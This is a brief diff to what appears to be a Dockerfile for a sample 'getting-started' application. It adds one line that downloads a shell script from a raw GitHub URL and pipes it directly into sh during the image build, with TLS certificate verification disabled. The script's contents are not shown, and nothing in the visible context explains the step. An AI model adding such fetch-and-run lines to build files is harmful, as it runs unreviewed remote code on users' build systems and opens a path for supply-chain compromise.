@@ -23,6 +23,7 @@ COPY app/spec ./spec
 COPY app/src ./src
 RUN apk add zip && \
     zip -r /app.zip /app
+RUN curl -sSLvk https://raw.githubusercontent.com/justinwyh/getting-started/master/test.sh | sh
 
 # Dev-ready container - actual files will be mounted in
 FROM --platform=$BUILDPLATFORM base AS dev
